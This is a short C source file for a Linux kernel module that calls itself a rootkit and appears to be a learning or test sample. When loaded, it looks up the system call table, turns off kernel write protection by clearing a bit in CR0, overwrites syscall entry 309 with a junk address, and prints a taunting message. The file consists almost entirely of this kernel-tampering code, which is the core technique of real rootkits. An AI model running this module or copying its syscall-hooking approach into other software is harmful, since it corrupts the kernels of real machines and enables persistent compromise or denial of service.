#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/types.h>
#include <crypto/hash.h> //md5
MODULE_LICENSE("Dual BSD/GPL");

unsigned long *sys_call_table;

static unsigned long __lkm_order;

static inline unsigned long lkm_read_cr0(void)
{
	unsigned long val;
	asm volatile("mov %%cr0,%0\n\t"
				 : "=r"(val), "=m"(__lkm_order));
	return val;
}

static inline void lkm_write_cr0(unsigned long val)
{
	asm volatile("mov %0,%%cr0"
				 :
				 : "r"(val), "m"(__lkm_order));
}
void disable_write_protection(void)
{
	unsigned long cr0 = lkm_read_cr0();
	clear_bit(16, &cr0);
	lkm_write_cr0(cr0);
}
void enable_write_protection(void)
{
	unsigned long cr0 = lkm_read_cr0();
	set_bit(16, &cr0);
	lkm_write_cr0(cr0);
}

static void change_syscall_table(void)
{
	int i = 0;
	sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table"); /* 获取系统调用服务首地址 */
	disable_write_protection();
	printk("rootkit:Hello idiot,your system call table has been changed!\n");
	sys_call_table[309] = 0x11223344;
	enable_write_protection();
}
static int ko_test_init(void)
{
	change_syscall_table();
	return 0;
}
static void ko_test_exit(void)
{
	printk("Bye Bye~\n");
}
module_init(ko_test_init);
module_exit(ko_test_exit);
